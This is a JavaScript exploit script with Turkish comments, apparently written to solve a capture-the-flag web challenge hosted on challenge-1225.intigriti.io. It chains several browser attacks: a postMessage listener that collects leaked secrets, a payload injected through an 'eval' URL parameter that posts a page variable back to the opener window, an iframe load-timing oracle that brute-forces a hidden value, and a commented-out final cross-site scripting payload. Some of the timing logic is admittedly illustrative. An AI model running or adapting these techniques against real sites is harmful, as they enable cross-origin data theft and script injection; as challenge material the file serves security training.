// pwn.js - Düzeltilmiş Versiyon

// Toplanan taşları saklayacağımız obje
var stones = {
    space: '',
    soul: '',
    time: '',
    mind: '',
    power: '',
    reality: ''
};

// --- PART 4: SPACE STONE (Zaten geliyor) ---
window.addEventListener('message', function(e) {
    // Parent'tan gelen 8 karakterlik hex kodu yakala
    if (typeof e.data === 'string' && e.data.length === 8) {
        console.log("[+] Space Stone Found:", e.data);
        stones.space = e.data;
        checkWin();
    }
    // Soul Stone'dan gelen mesajı yakala
    if (e.data && typeof e.data === 'string' && e.data.startsWith('Soul:')) {
        stones.soul = e.data.split(':')[1];
        console.log("[+] Soul Stone Found:", stones.soul);
        checkWin();
    }
});

// --- PART 5: SOUL STONE (Opener Fix) ---
// Soul Stone'u yeni pencerede açıyoruz ve "eval" parametresi ile
// veriyi bize (opener'a) geri postalamasını sağlıyoruz.
function triggerSoul() {
    // Soul Stone'un domainindeki 'soulStone' değişkenini okuyup postMessage atar.
    // 'self' ve 'top' kontrolünü geçmek için window.open kullanıyoruz.
    var payload = "opener.postMessage('Soul:'+soulStone, '*');window.close();";
    var target = "https://soul.challenge-1225.intigriti.io/?eval=" + encodeURIComponent(payload);
    window.open(target, '_blank');
}

// --- PART 6: TIME STONE (Timing Oracle) ---
async function crackTime() {
    var charset = '0123456789abcdef';
    var known = '';

    // Basit bir brute-force döngüsü
    while (known.length < 8) {
        for (var i = 0; i < charset.length; i++) {
            var char = charset[i];
            var guess = known + char;
            
            // iframe oluştur
            var ifr = document.createElement('iframe');
            // Cache'i atlatmak için rastgele parametre ekle
            ifr.src = "https://time.challenge-1225.intigriti.io/search?q=" + guess + "&bust=" + Math.random();
            document.body.appendChild(ifr);

            var start = performance.now();
            await new Promise(resolve => {
                ifr.onload = resolve;
            });
            var end = performance.now();
            var duration = end - start;

            ifr.remove();

            // Eşik değeri (Threshold): Bunu deneme yanılma ile bulman gerekebilir.
            // Genellikle doğru tahmin (redirect -> yes) farklı sürer.
            // Burası örnek mantıktır, ağ hızına göre değişir.
            if (duration > 500) { 
                console.log("Time char found:", char);
                known += char;
                break; 
            }
        }
    }
    stones.time = known;
    checkWin();
}

function checkWin() {
    // Sadece örnek olarak 3 taşı kontrol ediyoruz, hepsini ekleyebilirsin
    if (stones.space && stones.soul) {
        // Hepsi tamamlandığında:
        // const fullCode = stones.power + stones.mind + stones.reality + stones.space + stones.soul + stones.time;
        // parent.postMessage(fullCode + "alert(document.domain)", '*');
        console.log("WINNING STATE!");
    }
}

// Saldırıları başlat
setTimeout(triggerSoul, 1000);
// crackTime(); // Time stone brute-force'u başlatmak için yorumu kaldır
